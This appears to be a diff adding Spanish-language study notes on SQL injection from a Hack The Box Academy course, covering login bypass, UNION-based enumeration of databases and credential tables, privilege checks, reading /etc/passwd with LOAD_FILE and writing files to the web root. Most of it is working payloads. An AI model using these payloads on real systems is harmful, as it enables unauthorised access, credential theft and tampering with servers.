@@ -1,0 +1,148 @@
+	####SQLi
+Las inyeccioones de SQL se abusan de el input de un usuario no sanitizado. De esta forma, de podria intrducir codigo com "SHOW TABLES;" al buscar un usuario por una barra de busqueda.
+select * from logins where username like '%1'; SHOW TABLES;'
+#En este ejemplo se introdujo 1'; SHOW TABLES;
+#Esto es posible en MSSQL y Postgres, no en MySQL
+#Al final de la query hay un ' que estaba cerrando la sentencia de busqueda. Esto ocasionaria un error
+
+	####Subverting Query Logic
+	###Authentication Bypass
+Antes de bypasear la autenticacion, se debe probar si es vulnerable a SQLi. Para ello, agregamos alguno de los siguientes caracteres luego de nuestro usr para ver si hay algun tipo de error.
+Payload Encoding
+'	%27
+"	%22
+#	%23
+;	%3B
+)	%29
+
+#En algunos casos como una request GET se deberia usar el caracter url encodeado.
+
+	##OR Injection
+La query siempre debe devolver TRE. La sentencia OR puede ayudarnos a forzar esto.
+
+admin' or '1'='1
+#La query entera quedaria: SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
+#Admin es true, 1=1 es true, password es false. true (1=1) AND false (psw) es FALSE. Pero True (admin) OR False (resultado false de 1=1 AND password) es True
+#Primero se evalua el AND, luego el OR
+
+something' or '1'='1
+#Realizando esto en el campo password, se podria obtener un true por el mismo motivo anterior.
+
+Campo usr: ' or '1' = '1
+Campo psw: ' or '1' = '1
+#Retorna true por mas que el usuario no exista ni coincida con la pswd
+
+	##Using Comments
+Los comentarios son comunes para documentar el codigo. Los caracteres utilizados para esto son: -- y #
+De esta forma se podria baypasear el login brindando solo un usuario valido y comentando el resto dando como resultado que se comente la validacion de la password.
+
+Campo usr: admin'--
+Campo pswd: asd
+#De esta forma, como no se valida lo que hay en psw, se podria insertar cualquier cosa e igualmente daria true.
+
+Puede haber casos donde la query SQL evita que hagamos esto mediante una syntaxix tal que: WHERE (username = '<USER>' AND id > 1) AND password....
+Para baypasear esto no basta solo con agrregar admin' -- puesto que quedaria: WHERE (username = 'admin'--' AND id > 1) AND password....
+
+Campo usr: admin')--
+#Esto generaria que la query sea: WHERE (username = 'admin')--' AND id > 1) AND password....
+#Generando que se comente lo que le sigue. Dando como resultado SELECT * FROM logins where (username='admin')
+
+	##Union
+https://academy.hackthebox.com/module/33/section/216
+Union sirve para unir diferentes busquedas SELECT para volcar 2 o mas tablas. Dee esta forma con SELECT * FROM ports UNION SELECT * FROM ships; veriamos los datos tanto de la tabla ports como ships.
+Esto puede ser posible si y soolo si la cantidad de columnas de la tabla 1 es igual a la cantidad de columnas de la tabla 2.
+Por lo general, esto ultimo no suele darse, siendo un problema solucionar. La solucion a esto suele darse por usar datos no deseados.
+
+SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
+#En este caso, la tabla productos posee 2 columnas, 1 mas que la de passwords. De esta forma si agregamos un parametro mas a la parte de consulta a la tabla password, nos devolveria la misma cantidad de columnas haciendo posible el UNION
+
+El problema que debemos pasar ahora es la de saber la cantidad de columnas que posee una tabla. Se puede hacer de dos formas:
+
+	#Order by
+Gracias a ordenar mediante X columna podemos intentar ir ordenando por la columna 1, luego la 2 y asi sucesivamente hasta encontrarnos con un error. Ese error nos indica que la cantidad de columnas fue superada.
+' order by 1-- -
+' order by 2-- -
+
+	#Union
+La otra forma es intentar hacerr un union con una determinada cantidad de valores no deseaos.
+cn' UNION select 1,2,3,4-- -
+#El output de esto deberia no ser un error en caso de que la cantidad de columnas sea la correcta.
+
+Otro problema es la incapacidad de saber, a priori, cuales son las columnas que nos muestra la aplicacion. De esta forma, una vez determinada la cantidad de columnas, y una vez hayamos visto cuales de estas son mostradas por la app web, es que debemos injectar el codigo para que se nos muestre la data.
+cn' UNION select 1,@@version,3,4-- -
+#La columna 2, 3 y 4 son mostradas. De esta forma, si agregamoos el codigo en alguna de esas 3, veriamos la version de la db
+		
+	####Database Enumeration
+Primero debemos saber a que base de datos nos estamos enfrentando.
+
+Payload			When to Use				Expected Output						Wrong Output
+SELECT @@version	When we have full query output		MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'		In MSSQL it returns MSSQL version. Error with other DBMS.
+SELECT POW(1,1)		When we only have numeric output	1							Error with other DBMS
+SELECT SLEEP(5)		Blind/No Output				Delays page response for 5 seconds and returns 0.	Will not delay response with other DBMS
+
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+#Nos devuelve todos los noombres de las bases de datos existentes
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+#Lo mismo pero con UNION
+cn' UNION select 1,database(),2,3-- -
+#Nos permite conocer la base de datos a la cual se le realizan las consultas
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database>'-- -
+#Nos permite listar los nombres de la tablas y la db a la que pertenece. En este caso se busca para que la db solicitada sea dev
+#El segundo parametro puede ser un tanto redundante
+cn' UNION select 1,COLUMN_NAME,2,3 from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'-- - 
+#Busco los nombres de las columbas de la tabla credenciales que me aparecio antes
+cn' UNION select 1, <columna1>, <columna2>, 4 from <database>.<table>-- -
+#El rresultado de las columnas fue de 2: username y passwords
+
+	####Leer archivos
+Primero debemos saber que usuario tenemos y, dependiendo esto, saber los alcances que puede tener tanto en lectura como escritura de archivos mediante el permiso FILE.
+
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+#Saber el usuario que somos en sql
+
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+#Lo mismo pero con union
+cn' UNION SELECT 1, user(), 3, 4-- -
+#Opcion 2
+
+SELECT super_priv FROM mysql.user
+#Conocer si se posoeen privilegios super usr mediante sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+#Lo mismo pero con union
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+#Para ver los privilegios de un usr en particular
+
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+#Conocer otros tipos de permisos
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
+#Para un usr en particular
+
+SELECT LOAD_FILE('/etc/passwd');
+#En caso de tener privilegios FILE. Se pueden leer archivos en sql de esta manera
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+#Lo mismo pero con UNION
+
+Algo muy importante al tener en cuenta si nos encontramos con un php es que los INCLUDE se utilizan para usar en el codigo otro archivo. De esta forma, si en la pagina donde esta el SQL vemos un include X.php quiere decirnos que hay un file X.php que existe lo cual nos permite intentar leer dicha pagina con LOAD_FILE.
+Si estamos en una pagina PHP que obbtiene otras paginas mediante un ej index.php?q=XX, seria buenoo intentar url/include.XX
+
+
+	####Escribir archivios
+Para escribir archivos se necesita:
+1. User with FILE privilege enabled
+2. MySQL global secure_file_priv variable not enabled
+3. Write access to the location we want to write to on the back-end server
+
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+#SQL query para ver pto 2
+#global_variables posee 2 columnas: variable_name y variable_values
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+#Con UNION
+#Si se nos muestra como empty, quiere decir que es posible escribir
+
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+#Escribimos en ese directorio 'this is a test'
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+#Escribiendo mediante UNION
+#
